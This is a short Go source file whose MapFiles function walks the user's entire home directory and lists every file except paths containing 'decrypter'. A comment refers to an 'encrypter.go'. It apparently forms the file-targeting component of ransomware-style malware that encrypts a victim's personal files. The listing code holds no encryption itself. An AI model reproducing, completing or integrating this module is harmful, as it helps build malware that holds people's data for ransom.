package explorer

import (
	"io/fs"
	"os"
	"path/filepath"
	"runtime"
	"strings"
)

func MapFiles(dir string) []string {
	var files []string
	var root string

	if runtime.GOOS == "windows" {
		root = os.Getenv("USERPROFILE")
	} else {
		root = os.Getenv("HOME")
	}
	//check if has dir variable in encrypter.go else set root to /
	if dir == "" {
		root += "/"
	} else {
		root += dir
	}

	error := filepath.WalkDir(root, func(path string, entry fs.DirEntry, err error) error {
		if err != nil {
			return err
		}

		if strings.Contains(path, "decrypter") {
			return nil
		} else {
			files = append(files, path)
			return nil
		}
	})

	if error != nil {
		panic(error)
	}

	return files
}
